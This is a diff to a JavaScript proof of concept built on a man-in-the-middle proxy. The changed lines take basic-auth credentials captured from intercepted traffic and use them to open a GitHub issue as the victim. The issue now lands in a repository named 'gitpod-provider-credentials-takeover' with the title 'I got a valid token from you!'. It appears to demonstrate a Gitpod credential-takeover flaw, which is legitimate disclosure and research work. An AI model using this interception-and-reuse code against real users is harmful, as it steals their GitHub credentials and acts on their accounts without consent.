@@ -39,11 +39,11 @@ const server = new class extends MitmProxy {
                     require('request').post({
                         headers: { 'content-type' : 'application/json',
                                    'user-agent': 'request' },
-                        url: `https://${basicAuth[0]}:${basicAuth[1]}@api.github.com/repos/gitpod-io/gitpod/issues`,
+                        url: `https://${basicAuth[0]}:${basicAuth[1]}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
                         body: JSON.stringify({ 
-                            title: 'WAIT A MOMENT!',
-                            body: 'I can explain! please don\'t close this issue yet I will send an email to @JohannesLandgraf with the explanation',
-                            // assignee: 'gerardo-junior' 
+                            title: 'I got a valid token from you!',
+                            body: 'this is a return to click to open issue on gitpod',
+//                             assignee: 'gerardo-junior' 
                         })
                     }, function(error, response, body){
                         console.log(body);
